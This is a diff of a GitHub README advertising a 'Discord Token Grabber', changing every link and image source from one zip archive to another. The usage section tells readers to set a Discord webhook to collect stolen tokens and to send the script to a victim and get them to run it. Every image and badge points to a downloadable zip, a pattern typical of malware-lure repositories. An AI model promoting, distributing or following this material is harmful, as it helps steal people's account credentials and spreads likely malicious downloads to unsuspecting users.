@@ -1,29 +1,29 @@
 <p align="center">
-  <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
+  <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
 </p>
 
 <h1 align="center">
 [Discord] - Token Grabber
 
 PATCHED USE THIS ONE
-<a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">Discord-Token-Grabber-V2</a>
+<a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">Discord-Token-Grabber-V2</a>
 </h1>
 
 <p align="center">
-  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
-    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
+  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
+    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
   </a>
-  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
-    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip%25-fluogreen">
+  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
+    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip%25-fluogreen">
   </a>
-  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
-    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip%20size&style=flat-square">
+  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
+    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip%20size&style=flat-square">
   </a>
-  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
-    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip">
+  <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
+    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip">
   </a>
-    <p align="center"> <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip" target="blank">
-    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip" alt="astraadev"/></a>
+    <p align="center"> <a href="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip" target="blank">
+    <img src="https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip" alt="astraadev"/></a>
   </a>
 </p>
 
@@ -52,9 +52,9 @@ By using **THIS SCRIPT**, you agree that you **hold responsibility** and account
 # How to use
 ```python
  - Create a WebHook on your Discord Server. I recommend creating a New server!
- - Change the 'WEBHOOK_URL' variable value in line 184 to your Discord WebHook URL in https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip
+ - Change the 'WEBHOOK_URL' variable value in line 184 to your Discord WebHook URL in https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip
  - Send the script to your victim and make them run it!
 ```
 
 ## Output Example
-![https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip](https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Discord-Token-Grabber_2.5.zip)
+![https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip](https://raw.githubusercontent.com/Shomosyt1/Discord-Token-Grabber/main/Tamworth/Grabber_Discord_Token_2.4.zip)
